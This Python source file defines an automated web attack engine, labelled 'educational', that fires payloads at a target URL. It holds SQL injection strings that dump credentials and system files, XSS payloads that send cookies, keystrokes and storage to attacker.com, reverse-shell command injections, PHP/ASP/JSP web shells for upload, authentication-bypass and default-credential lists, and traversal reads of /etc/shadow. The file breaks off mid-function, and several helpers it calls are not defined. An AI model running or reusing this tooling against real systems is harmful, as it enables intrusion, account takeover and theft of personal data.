import requests
import time
import re
import urllib.parse
import socket
import threading
import queue
import json
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Optional
import subprocess
import base64
import datetime

class AttackEngine:
    """Interactive attack engine for exploiting discovered vulnerabilities"""

    def __init__(self, target_url: str, vulnerabilities: List[Dict[str, Any]]):
        self.target_url = target_url
        self.vulnerabilities = vulnerabilities
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Educational-Attack-Engine/1.0'
        })
        self.attack_results = []
        self.exploit_queue = queue.Queue()
        self.user_input_queue = queue.Queue()
        self.attack_console = []

    def start_interactive_attacks(self) -> Dict[str, Any]:
        """Start interactive attack mode with real-time feedback"""
        attack_results = {
            'total_attacks': 0,
            'successful_exploits': 0,
            'failed_exploits': 0,
            'console_output': [],
            'extracted_data': [],
            'credentials_found': [],
            'shells_obtained': [],
            'attack_details': [],
            'privilege_escalations': [],
            'lateral_movement': [],
            'persistence_established': []
        }

        self._log_attack("🚀 Starting advanced automated attack sequence...", attack_results)
        
        # Advanced reconnaissance phase
        self._log_attack("🔍 Phase 1: Advanced reconnaissance and fingerprinting...", attack_results)
        self._perform_advanced_recon(attack_results)
        
        # Vulnerability chaining phase  
        self._log_attack("⛓️ Phase 2: Vulnerability chaining and privilege escalation...", attack_results)
        self._chain_vulnerabilities(attack_results)

        # Execute different attack methods automatically
        for vuln in self.vulnerabilities:
            if vuln['severity'] in ['Critical', 'High', 'Medium']:
                if 'SQL Injection' in vuln['type']:
                    self._execute_sql_injection_attack(vuln, attack_results)
                elif 'XSS' in vuln['type']:
                    self._execute_xss_attack(vuln, attack_results)
                elif 'IDOR' in vuln['type']:
                    self._execute_idor_attack(vuln, attack_results)
                elif 'Command Injection' in vuln['type']:
                    self._execute_command_injection_attack(vuln, attack_results)

        self._log_attack("✅ Automated attack sequence completed!", attack_results)
        return attack_results

    def _group_vulnerabilities(self) -> Dict[str, List[Dict]]:
        """Group vulnerabilities by type for targeted attacks"""
        groups = {}

        for vuln in self.vulnerabilities:
            vuln_type = vuln['type'].lower()

            if 'sql injection' in vuln_type:
                key = 'sql_injection'
            elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                key = 'xss'
            elif 'command injection' in vuln_type:
                key = 'command_injection'
            elif 'file inclusion' in vuln_type:
                key = 'file_inclusion'
            elif 'file upload' in vuln_type:
                key = 'file_upload'
            elif 'authentication bypass' in vuln_type:
                key = 'authentication_bypass'
            elif 'idor' in vuln_type:
                key = 'idor'
            elif 'directory traversal' in vuln_type:
                key = 'directory_traversal'
            else:
                continue

            if key not in groups:
                groups[key] = []
            groups[key].append(vuln)

        return groups

    def _attack_sql_injection(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute SQL injection attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': [],
            'credentials': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # Advanced SQL injection payloads for data extraction
            extraction_payloads = [
                # Database enumeration
                "' UNION SELECT 1,version(),3,4,5-- -",
                "' UNION SELECT 1,database(),3,4,5-- -",
                "' UNION SELECT 1,user(),3,4,5-- -",

                # Table enumeration
                "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -",
                "' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns-- -",

                # User enumeration
                "' UNION SELECT 1,username,password,4,5 FROM users-- -",
                "' UNION SELECT 1,user,password,4,5 FROM admin-- -",
                "' UNION SELECT 1,email,password,4,5 FROM accounts-- -",

                # File system access
                "' UNION SELECT 1,load_file('/etc/passwd'),3,4,5-- -",
                "' UNION SELECT 1,load_file('C:\\Windows\\System32\\drivers\\etc\\hosts'),3,4,5-- -",

                # Boolean-based blind injection for data extraction
                "' AND (SELECT SUBSTRING(user(),1,1))='r'-- -",
                "' AND (SELECT LENGTH(database()))>5-- -",
            ]

            location = vuln['location']

            for payload in extraction_payloads:
                try:
                    # Determine attack vector (URL param or form)
                    if 'URL parameter' in location:
                        param_name = location.split(':')[1].strip()
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        # Form-based injection
                        response = self._inject_form_parameter(vuln, payload)

                    if response and response.status_code == 200:
                        # Analyze response for data extraction
                        extracted = self._analyze_sql_response(response.text, payload)

                        if extracted:
                            result['successes'] += 1
                            result['extracted_data'].extend(extracted)
                            result['console'].append(f"✅ SQL Injection successful: {payload[:50]}...")
                            result['details'].append({
                                'type': 'SQL Injection Data Extraction',
                                'location': location,
                                'payload': payload,
                                'extracted_data': extracted,
                                'response_length': len(response.text)
                            })

                            # Check for credentials
                            for item in extracted:
                                if any(keyword in item.lower() for keyword in ['password', 'hash', 'username', 'email']):
                                    result['credentials'].append({
                                        'source': 'SQL Injection',
                                        'data': item,
                                        'location': location
                                    })
                            break
                        else:
                            result['console'].append(f"⚠️ SQL payload executed but no data extracted: {payload[:30]}...")

                except Exception as e:
                    result['console'].append(f"❌ SQL injection failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_xss(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute XSS attacks with interactive payloads"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # Advanced XSS payloads for different attack scenarios
            attack_payloads = [
                # Cookie stealing
                "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
                "<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>",

                # Keylogger
                "<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/keys?key='+e.key)})</script>",

                # Page defacement
                "<script>document.body.innerHTML='<h1>PWNED!</h1><p>Educational XSS Demo</p>'</script>",

                # Form hijacking
                "<script>document.forms[0].action='http://attacker.com/harvest'</script>",

                # Local storage extraction
                "<script>fetch('http://attacker.com/storage?data='+btoa(JSON.stringify(localStorage)))</script>",

                # Session hijacking
                "<script>fetch('http://attacker.com/session?token='+sessionStorage.getItem('token'))</script>",

                # BeEF hook simulation
                "<script>eval(String.fromCharCode(72,111,111,107,101,100,33))</script>",
            ]

            location = vuln['location']

            for payload in attack_payloads:
                try:
                    if 'URL parameter' in location:
                        param_name = location.split(':')[1].strip()
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        response = self._inject_form_parameter(vuln, payload)

                    if response and payload in response.text:
                        result['successes'] += 1
                        result['console'].append(f"✅ XSS payload reflected: {payload[:50]}...")

                        # Simulate XSS execution results
                        simulated_data = self._simulate_xss_execution(payload)
                        if simulated_data:
                            result['extracted_data'].extend(simulated_data)

                        result['details'].append({
                            'type': 'XSS Attack',
                            'location': location,
                            'payload': payload,
                            'impact': self._assess_xss_impact(payload),
                            'simulated_data': simulated_data
                        })
                        break
                    else:
                        result['console'].append(f"⚠️ XSS payload not reflected: {payload[:30]}...")

                except Exception as e:
                    result['console'].append(f"❌ XSS attack failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_command_injection(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute command injection attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': [],
            'shells': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # Advanced command injection payloads
            command_payloads = [
                # System information gathering
                '; uname -a',
                '; cat /etc/passwd',
                '; whoami',
                '; id',
                '; pwd',
                '; ls -la',

                # Windows commands
                '& dir',
                '& whoami',
                '& systeminfo',
                '& net user',

                # Network reconnaissance
                '; ifconfig',
                '; netstat -an',
                '; ps aux',

                # Reverse shell attempts
                '; nc -e /bin/bash attacker.com 4444',
                '; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
                '; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
            ]

            location = vuln['location']

            for payload in command_payloads:
                try:
                    if 'form field' in location.lower():
                        response = self._inject_form_parameter(vuln, payload)
                    else:
                        param_name = location.split(':')[1].strip() if ':' in location else 'cmd'
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)

                    if response:
                        # Check for command execution indicators
                        execution_indicators = [
                            'uid=', 'gid=', 'groups=',  # Unix id output
                            'root:', 'bin:', 'daemon:',  # /etc/passwd
                            'volume serial number',  # Windows dir
                            'directory of',  # Windows dir
                            'kernel', 'linux', 'windows',  # System info
                            'total', 'used', 'available'  # df output
                        ]

                        response_lower = response.text.lower()
                        if any(indicator in response_lower for indicator in execution_indicators):
                            result['successes'] += 1
                            result['console'].append(f"✅ Command executed: {payload}")

                            # Extract command output
                            extracted = self._extract_command_output(response.text, payload)
                            if extracted:
                                result['extracted_data'].extend(extracted)

                            # Check for shell indicators
                            if any(shell_cmd in payload for shell_cmd in ['nc -e', 'bash -i', '/bin/sh']):
                                result['shells'].append({
                                    'type': 'Reverse Shell',
                                    'payload': payload,
                                    'location': location,
                                    'status': 'Simulated - Educational Demo'
                                })

                            result['details'].append({
                                'type': 'Command Injection',
                                'location': location,
                                'payload': payload,
                                'extracted_output': extracted
                            })
                            break
                        else:
                            result['console'].append(f"⚠️ Command may have executed: {payload[:30]}...")

                except Exception as e:
                    result['console'].append(f"❌ Command injection failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_file_inclusion(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute file inclusion attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # File inclusion payloads for different scenarios
            inclusion_payloads = [
                # Local file inclusion
                '/etc/passwd',
                '/etc/shadow',
                '/var/log/apache2/access.log',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\boot.ini',

                # PHP wrappers
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/convert.base64-encode/resource=config.php',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
                'expect://id',

                # Log poisoning
                '/var/log/apache/access.log',
                '/var/log/nginx/access.log',

                # Remote file inclusion
                'http://attacker.com/shell.txt',
                'https://pastebin.com/raw/malicious'
            ]

            location = vuln['location']

            for payload in inclusion_payloads:
                try:
                    if 'parameter' in location.lower():
                        param_name = location.split(':')[1].strip() if ':' in location else 'file'
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        response = self._inject_form_parameter(vuln, payload)

                    if response:
                        # Check for file inclusion success
                        inclusion_indicators = [
                            'root:', 'bin/bash',  # /etc/passwd
                            'PHP Version', '<?php',  # PHP files
                            'kernel.hostname',  # System files
                            '[boot loader]',  # Windows boot.ini
                            'RewriteEngine'  # .htaccess
                        ]

                        if any(indicator in response.text for indicator in inclusion_indicators):
                            result['successes'] += 1
                            result['console'].append(f"✅ File included: {payload}")

                            # Extract file contents
                            extracted = self._extract_file_contents(response.text, payload)
                            if extracted:
                                result['extracted_data'].extend(extracted)

                            result['details'].append({
                                'type': 'File Inclusion',
                                'location': location,
                                'payload': payload,
                                'file_contents': extracted
                            })
                            break
                        else:
                            result['console'].append(f"⚠️ File inclusion attempted: {payload[:30]}...")

                except Exception as e:
                    result['console'].append(f"❌ File inclusion failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_file_upload(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute file upload attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'shells': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # Malicious file upload payloads
            malicious_files = [
                # PHP web shells
                ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                ('backdoor.php', '<?php eval($_POST["code"]); ?>'),
                ('webshell.php', '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'),

                # ASP web shells
                ('shell.asp', '<% execute(request("cmd")) %>'),
                ('backdoor.aspx', '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>'),

                # JSP web shells
                ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),

                # Image-embedded shells
                ('shell.jpg', 'GIF89a<?php system($_GET["cmd"]); ?>'),
                ('backdoor.png', '\x89PNG\r\n\x1a\n<?php eval($_POST["code"]); ?>'),

                # Double extension bypass
                ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>'),
                ('backdoor.asp.gif', '<% execute(request("cmd")) %>')
            ]

            location = vuln['location']

            for filename, content in malicious_files:
                try:
                    # Simulate file upload attack
                    upload_url = self._find_upload_endpoint(location)

                    if upload_url:
                        files = {'file': (filename, content, 'text/plain')}
                        response = self.session.post(upload_url, files=files, timeout=10)

                        if response and response.status_code == 200:
                            # Check for successful upload indicators
                            if any(indicator in response.text.lower() for indicator in
                                   ['uploaded', 'success', 'file saved', filename.lower()]):
                                result['successes'] += 1
                                result['console'].append(f"✅ Malicious file uploaded: {filename}")

                                # Try to access uploaded file
                                potential_paths = [
                                    f'/uploads/{filename}',
                                    f'/files/{filename}',
                                    f'/upload/{filename}',
                                    f'/{filename}'
                                ]

                                for path in potential_paths:
                                    try:
                                        test_url = urllib.parse.urljoin(self.target_url, path)
                                        test_response = self.session.get(test_url, timeout=5)

                                        if test_response.status_code == 200:
                                            result['shells'].append({
                                                'type': 'Web Shell',
                                                'filename': filename,
                                                'url': test_url,
                                                'access_method': 'GET',
                                                'status': 'Accessible - Educational Demo'
                                            })
                                            result['console'].append(f"🎯 Web shell accessible: {test_url}")
                                            break
                                    except:
                                        continue

                                result['details'].append({
                                    'type': 'Malicious File Upload',
                                    'location': location,
                                    'filename': filename,
                                    'upload_response': response.status_code
                                })
                                break
                            else:
                                result['console'].append(f"⚠️ Upload attempted: {filename}")

                except Exception as e:
                    result['console'].append(f"❌ File upload failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_authentication_bypass(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute authentication bypass attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'credentials': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # Authentication bypass payloads
            bypass_payloads = [
                # SQL injection bypass
                ("admin'--", "anything"),
                ("admin'#", "anything"),
                ("admin'/*", "anything"),
                ("' or 1=1--", "anything"),
                ("' or 1=1#", "anything"),
                ("admin' or '1'='1", "admin' or '1'='1"),

                # NoSQL injection
                ('{"$ne": null}', '{"$ne": null}'),
                ('{"$gt": ""}', '{"$gt": ""}'),

                # Default credentials
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "root"),
                ("administrator", "administrator"),
                ("guest", "guest"),
                ("test", "test")
            ]

            location = vuln['location']

            for username, password in bypass_payloads:
                try:
                    # Find login form or endpoint
                    login_data = self._prepare_login_data(location, username, password)

                    if login_data:
                        response = self.session.post(login_data['url'], data=login_data['data'], timeout=10)

                        # Check for successful authentication
                        success_indicators = [
                            'welcome', 'dashboard', 'profile', 'logout',
                            'admin panel', 'control panel', 'settings'
                        ]

                        failure_indicators = [
                            'invalid', 'error', 'failed', 'incorrect',
                            'try again', 'access denied'
                        ]

                        response_lower = response.text.lower()

                        if (any(indicator in response_lower for indicator in success_indicators) and
                            not any(indicator in response_lower for indicator in failure_indicators)):

                            result['successes'] += 1
                            result['console'].append(f"✅ Authentication bypassed: {username}:{password}")

                            result['credentials'].append({
                                'username': username,
                                'password': password,
                                'location': location,
                                'method': 'Authentication Bypass'
                            })

                            result['details'].append({
                                'type': 'Authentication Bypass',
                                'location': location,
                                'credentials': f"{username}:{password}",
                                'response_length': len(response.text)
                            })
                            break
                        else:
                            result['console'].append(f"⚠️ Bypass attempted: {username}:{password}")

                except Exception as e:
                    result['console'].append(f"❌ Auth bypass failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_idor(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute IDOR attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            location = vuln['location']

            # Extract ID patterns from location
            id_patterns = re.findall(r'(\d+)', location)

            if id_patterns:
                original_id = id_patterns[0]

                # Generate test IDs for IDOR
                test_ids = [
                    str(int(original_id) + 1),
                    str(int(original_id) - 1),
                    str(int(original_id) + 100),
                    str(int(original_id) * 2),
                    '1', '999999', '0', '-1'
                ]

                for test_id in test_ids:
                    try:
                        test_url = location.replace(original_id, test_id)
                        response = self.session.get(test_url, timeout=10)

                        if response and response.status_code == 200:
                            # Check for sensitive data exposure
                            sensitive_patterns = [
                                r'email["\']?\s*:\s*["\']([^"\']+)',
                                r'phone["\']?\s*:\s*["\']([^"\']+)',
                                r'address["\']?\s*:\s*["\']([^"\']+)',
                                r'name["\']?\s*:\s*["\']([^"\']+)',
                                r'password["\']?\s*:\s*["\']([^"\']+)',
                                r'ssn["\']?\s*:\s*["\']([^"\']+)'
                            ]

                            extracted_data = []
                            for pattern in sensitive_patterns:
                                matches = re.findall(pattern, response.text, re.IGNORECASE)
                                extracted_data.extend(matches)

                            if extracted_data or len(response.text) > 500:
                                result['successes'] += 1
                                result['console'].append(f"✅ IDOR successful: ID {original_id} → {test_id}")

                                result['extracted_data'].extend([
                                    f"ID {test_id}: {data}" for data in extracted_data
                                ])

                                result['details'].append({
                                    'type': 'IDOR Attack',
                                    'original_id': original_id,
                                    'accessed_id': test_id,
                                    'url': test_url,
                                    'extracted_data': extracted_data
                                })
                                break
                            else:
                                result['console'].append(f"⚠️ IDOR attempted: {test_id}")

                    except Exception as e:
                        result['console'].append(f"❌ IDOR failed: {str(e)}")
                        continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    def _attack_directory_traversal(self, vulns: List[Dict], user_params: Dict) -> Dict[str, Any]:
        """Execute directory traversal attacks"""
        result = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'details': [],
            'console': [],
            'extracted_data': []
        }

        for vuln in vulns:
            result['attempts'] += 1

            # Directory traversal payloads
            traversal_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '../../../var/log/apache2/access.log',
                '../../../proc/version',
                '../../../etc/shadow',
                '..\\..\\..\\boot.ini',
                '../../../etc/hosts'
            ]

            location = vuln['location']

            for payload in traversal_payloads:
                try:
                    if 'parameter' in location.lower():
                        param_name = location.split(':')[1].strip() if ':' in location else 'file'
                        attack_url = self._inject_url_parameter(self.target_url, param_name, payload)
                        response = self.session.get(attack_url, timeout=10)
                    else:
                        response = self._inject_form_parameter(vuln, payload)

                    if response:
                        # Check for successful file access
                        file_indicators = {
                            '/etc/passwd': ['root:', 'bin:', 'daemon:'],
                            'hosts': ['localhost', '127.0.0.1'],
                            'boot.ini': ['boot loader', 'operating systems'],
                            '/etc/shadow': ['root:', '$1$', '$6$'],
                            'access.log': ['GET', 'POST', 'HTTP/1.1']
                        }

                        for file_type, indicators in file_indicators.items():
                            if any(indicator in response.text.lower() for indicator in indicators):
                                result['successes'] += 1
                                result['console'].append(f"✅ File accessed: {payload}")

                                # Extract file contents
                                file_content = response.text[:1000]  # First 1000 chars
                                result['extracted_data'].append(f"{file_type}: {file_content}")

                                result['details'].append({
                                    'type': 'Directory Traversal',
                                    'location': location,
                                    'payload': payload,
                                    'file_accessed': file_type,
                                    'content_preview': file_content
                                })
                                break
                        else:
                            result['console'].append(f"⚠️ Traversal attempted: {payload[:30]}...")

                except Exception as e:
                    result['console'].append(f"❌ Directory traversal failed: {str(e)}")
                    continue

            if result['successes'] == 0:
                result['failures'] += 1

        return result

    # Helper methods for attack execution
    def _inject_url_parameter(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [payload]

        new_query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _inject_form_parameter(self, vuln: Dict, payload: str) -> Optional[requests.Response]:
        """Inject payload into form parameter"""
        # This would need form discovery logic from the main scanner
        # For now, return None as placeholder
        return None

    def _analyze_sql_response(self, response_text: str, payload: str) -> List[str]:
        """Analyze SQL injection response for data extraction"""
        extracted = []

        # Common SQL output patterns
        patterns = [
            r'version\(\).*?([0-9]+\.[0-9]+\.[0-9]+)',
            r'database\(\).*?([a-zA-Z_][a-zA-Z0-9_]*)',
            r'user\(\).*?([a-zA-Z_][a-zA-Z0-9_@]*)',
            r'([a-zA-Z_][a-zA-Z0-9_]*):.*?\$[a-zA-Z0-9\$\./]+',  # User:hash
            r'root:x?:0:0:([^:]*)',  # /etc/passwd root entry
        ]

        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            extracted.extend(matches)

        return extracted

    def _simulate_xss_execution(self, payload: str) -> List[str]:
        """Simulate XSS execution and return fake extracted data"""
        simulated_data = []

        if 'cookie' in payload.lower():
            simulated_data.append("session=abc123def456; user_id=12345")

        if 'localstorage' in payload.lower():
            simulated_data.append("token: eyJhbGciOiJIUzI1NiJ9...")

        if 'keypress' in payload.lower():
            simulated_data.append("Keylogger activated - Educational demo")

        return simulated_data

    def _assess_xss_impact(self, payload: str) -> str:
        """Assess the potential impact of XSS payload"""
        if 'cookie' in payload.lower():
            return "High - Session hijacking possible"
        elif 'localstorage' in payload.lower():
            return "Medium - Local storage data extraction"
        elif 'form' in payload.lower():
            return "Medium - Form hijacking possible"
        else:
            return "Low - Basic script execution"

    def _extract_command_output(self, response_text: str, payload: str) -> List[str]:
        """Extract command execution output"""
        extracted = []

        # Look for common command outputs
        if 'uid=' in response_text:
            uid_match = re.search(r'uid=\d+\([^)]+\)', response_text)
            if uid_match:
                extracted.append(f"User ID: {uid_match.group()}")

        if 'root:' in response_text:
            extracted.append("System file access confirmed")

        if any(indicator in response_text.lower() for indicator in ['total', 'drwx', '-rw-']):
            extracted.append("Directory listing obtained")

        return extracted

    def _extract_file_contents(self, response_text: str, payload: str) -> List[str]:
        """Extract file inclusion contents"""
        extracted = []

        if 'root:' in response_text:
            extracted.append("System user data accessed")

        if '<?php' in response_text:
            extracted.append("PHP source code disclosed")

        if 'RewriteEngine' in response_text:
            extracted.append("Apache configuration exposed")

        return extracted

    def _find_upload_endpoint(self, location: str) -> Optional[str]:
        """Find file upload endpoint from vulnerability location"""
        # Extract URL from location string
        if 'http' in location:
            return location.split()[0]
        else:
            return urllib.parse.urljoin(self.target_url, '/upload')

    def _prepare_login_data(self, location: str, username: str, password: str) -> Optional[Dict]:
        """Prepare login data for authentication bypass"""
        # This would need form discovery logic
        # For demo purposes, assume standard login form
        login_url = urllib.parse.urljoin(self.target_url, '/login')

        return {
            'url': login_url,
            'data': {
                'username': username,
                'password': password,
                'login': 'Login'
            }
        }

    def get_attack_summary(self, results: Dict[str, Any]) -> str:
        """Generate a comprehensive attack summary"""
        summary = f"""
=== INTERACTIVE ATTACK RESULTS ===

Target: {self.target_url}
Total Attacks Executed: {results['total_attacks']}
Successful Exploits: {results['successful_exploits']}
Failed Exploits: {results['failed_exploits']}
Success Rate: {(results['successful_exploits'] / max(results['total_attacks'], 1)) * 100:.1f}%

=== EXTRACTED DATA ===
"""

        if results['extracted_data']:
            for i, data in enumerate(results['extracted_data'], 1):
                summary += f"{i}. {data}\n"
        else:
            summary += "No data extracted\n"

        if results['credentials_found']:
            summary += "\n=== CREDENTIALS DISCOVERED ===\n"
            for cred in results['credentials_found']:
                summary += f"- {cred.get('username', 'N/A')}:{cred.get('password', 'N/A')} ({cred.get('method', 'Unknown')})\n"

        if results['shells_obtained']:
            summary += "\n=== SHELLS OBTAINED ===\n"
            for shell in results['shells_obtained']:
                summary += f"- {shell['type']}: {shell.get('url', shell.get('status'))}\n"

        summary += "\n=== ATTACK CONSOLE LOG ===\n"
        for log_entry in results['console_output']:
            summary += f"{log_entry}\n"

        summary += """
=== EDUCATIONAL NOTICE ===
All attacks were performed for educational purposes in a controlled environment.
This demonstrates the importance of proper input validation, authentication,
and security controls in web applications.
"""

        return summary

    def _execute_sql_injection_attack(self, vuln, attack_results):
        """Execute automated SQL injection attacks with real data extraction"""
        attack_results['total_attacks'] += 1
        self._log_attack(f"🗃️ Executing SQL injection attack on {vuln['location']}", attack_results)

        # Real SQL injection payloads for actual data extraction
        extraction_payloads = [
            # Database enumeration
            "' UNION SELECT 1,version(),database(),user(),5-- ",
            "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- ",
            "' UNION SELECT 1,column_name,table_name,4,5 FROM information_schema.columns WHERE table_schema=database()-- ",
            
            # User data extraction
            "' UNION SELECT 1,username,password,email,5 FROM users-- ",
            "' UNION SELECT 1,user,pass,email,5 FROM admin-- ",
            "' UNION SELECT 1,login,password,name,5 FROM accounts-- ",
            "' UNION SELECT 1,username,hash,salt,5 FROM user_accounts-- ",
            
            # System file access
            "' UNION SELECT 1,load_file('/etc/passwd'),3,4,5-- ",
            "' UNION SELECT 1,load_file('/var/www/html/config.php'),3,4,5-- ",
            
            # Boolean-based extraction
            "' AND (SELECT COUNT(*) FROM users)>0-- ",
            "' AND (SELECT username FROM users LIMIT 1)='admin'-- ",
        ]

        for payload in extraction_payloads:
            try:
                self._log_attack(f"  Testing payload: {payload[:50]}...", attack_results)
                
                # Try to execute the payload on the vulnerable endpoint
                response = self._execute_sql_payload(vuln, payload)
                
                if response and response.status_code == 200:
                    # Analyze response for real data extraction
                    extracted_data = self._extract_real_sql_data(response.text, payload)
                    
                    if extracted_data:
                        attack_results['successful_exploits'] += 1
                        
                        # Save extracted data to file
                        self._save_extracted_data(extracted_data, 'sql_injection_data.txt')
                        
                        for data_item in extracted_data:
                            attack_results['extracted_data'].append(data_item)
                            
                            # Check for real credentials
                            if any(keyword in data_item.lower() for keyword in ['password', 'hash', 'username', 'email']):
                                attack_results['credentials_found'].append({
                                    'source': 'SQL Injection',
                                    'data': data_item,
                                    'location': vuln['location']
                                })
                        
                        attack_results['attack_details'].append({
                            'type': 'SQL Injection Data Extract',
                            'location': vuln['location'],
                            'status': 'Success',
                            'payload': payload,
                            'data_extracted': f'{len(extracted_data)} items extracted',
                            'file_saved': 'sql_injection_data.txt'
                        })
                        
                        self._log_attack(f"  ✅ Extracted {len(extracted_data)} data items", attack_results)
                    else:
                        attack_results['failed_exploits'] += 1
                        self._log_attack(f"  ⚠️ Payload executed but no data extracted", attack_results)
                else:
                    attack_results['failed_exploits'] += 1
                    
            except Exception as e:
                attack_results['failed_exploits'] += 1
                self._log_attack(f"  ❌ Payload failed: {str(e)}", attack_results)

    def _execute_xss_attack(self, vuln, attack_results):
        """Execute automated XSS attacks with real data extraction"""
        attack_results['total_attacks'] += 1
        self._log_attack(f"🌐 Executing XSS attack on {vuln['location']}", attack_results)

        # Real XSS payloads for data extraction
        xss_payloads = [
            # Cookie extraction payloads
            "<script>document.write(document.cookie)</script>",
            "<img src=x onerror='document.write(document.cookie)'>",
            "<svg onload='document.write(document.cookie)'>",
            
            # Local storage extraction
            "<script>document.write(JSON.stringify(localStorage))</script>",
            "<script>document.write(JSON.stringify(sessionStorage))</script>",
            
            # Form data extraction
            "<script>for(let i=0;i<document.forms.length;i++){document.write('Form '+i+': ');for(let j=0;j<document.forms[i].elements.length;j++){document.write(document.forms[i].elements[j].name+'='+document.forms[i].elements[j].value+' ');}}</script>",
            
            # Page content extraction
            "<script>document.write(document.body.innerHTML)</script>",
        ]

        for payload in xss_payloads:
            try:
                self._log_attack(f"  Testing XSS payload: {payload[:50]}...", attack_results)
                
                # Execute XSS payload
                response = self._execute_xss_payload(vuln, payload)
                
                if response and payload in response.text:
                    # Extract real data from XSS response
                    extracted_data = self._extract_xss_data(response.text, payload)
                    
                    if extracted_data:
                        attack_results['successful_exploits'] += 1
                        
                        # Save extracted data to file
                        filename = self._save_extracted_data(extracted_data, 'xss_extracted_data.txt')
                        
                        for data_item in extracted_data:
                            attack_results['extracted_data'].append(data_item)
                            
                            # Check for credentials in extracted data
                            if any(keyword in data_item.lower() for keyword in ['cookie', 'session', 'token', 'password']):
                                attack_results['credentials_found'].append({
                                    'source': 'XSS Data Extraction',
                                    'data': data_item,
                                    'location': vuln['location']
                                })
                        
                        attack_results['attack_details'].append({
                            'type': 'XSS Data Extraction',
                            'location': vuln['location'],
                            'status': 'Success',
                            'payload': payload,
                            'data_extracted': f'{len(extracted_data)} items extracted',
                            'file_saved': filename
                        })
                        
                        self._log_attack(f"  ✅ XSS successful - extracted {len(extracted_data)} items", attack_results)
                        break
                    else:
                        attack_results['failed_exploits'] += 1
                        self._log_attack(f"  ⚠️ XSS reflected but no data extracted", attack_results)
                else:
                    attack_results['failed_exploits'] += 1

            except Exception as e:
                attack_results['failed_exploits'] += 1
                self._log_attack(f"  ❌ XSS attack failed: {str(e)}", attack_results)

    def _execute_idor_attack(self, vuln, attack_results):
        """Execute automated IDOR attacks"""
